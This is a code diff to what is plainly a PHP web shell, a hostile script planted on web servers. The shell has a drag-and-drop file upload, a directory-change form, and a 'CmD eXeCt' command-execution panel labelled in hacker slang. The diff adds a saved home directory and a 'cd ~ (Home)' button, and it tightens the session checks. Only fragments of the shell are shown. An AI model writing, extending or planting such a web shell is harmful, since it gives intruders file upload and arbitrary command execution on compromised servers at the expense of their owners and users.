@@ -1,9 +1,8 @@
 <?php session_start();
 
-
-if(@$_SESSION['d']=='')
+if(@$_SESSION['d']=='' || !@opendir($_SESSION['d']) || !@opendir($_SESSION['hd']))
 {
-$_SESSION['d']=getcwd();
+$_SESSION['d'] = $_SESSION['hd'] = getcwd();
 }
 
 $head = '
@@ -215,7 +214,6 @@ if (move_uploaded_file($_FILES['drag']['tmp_name'], $_FILES['drag']['name']))
 			{
 				if (@opendir(trim($_POST['di']))) 
 				{
-			unset($_SESSION['d']);
 			$_SESSION['d'] = trim($_POST['di']);
 				}
 				else 
@@ -259,6 +257,8 @@ if (move_uploaded_file($_FILES['drag']['tmp_name'], $_FILES['drag']['name']))
 			}
 			
 			}
+			} elseif (isset($_POST['cd']) && $_POST['cd']=='@home@'){
+				$_SESSION['d'] = $_SESSION['hd'];
 			}
 			if($_SESSION['d']=='')
 			{
@@ -276,7 +276,7 @@ file lo : <input type=file name=drag>
 <input type=submit name=df value="chadaa de :|"></div>
 
 <br>
-<table width=100% style="border:0px;background:#191919;"> <tr style="vertical-align:top;"><td width=50%><a href="#" onclick="lhook('dlist');" style="border:1px;background:black;">DiReCtOrY cH</a><br>
+<table width=100% style="border:0px;background:#191919;"> <tr style="vertical-align:top;"><td width=50%><a href="#" onclick="lhook('dlist');" style="border:1px;background:black;">DiReCtOrY cH</a> <form method="POST"><input type="hidden" name="act" value="@home@"/><button name="cd" style="border:1px;background:black;color:#F00;" value="@home@" type="submit">cd ~ (Home)</button></form><br>
 <div id="dlist" style="display:none;"><form method=post style="margin: 5px 0px 0px 0px;">
 <input type=text name=di value="<?php echo  $_SESSION['d'];?>" style="width: 300px;margin:0px 2px 10px"><input  type=submit name=d value="chal billu, Ghuma de sode n :3"></form></div></td>
 <td align=left><a href="#" onclick="lhook('cmx');" style="border:1px;background:black;">CmD eXeCt</a><br>
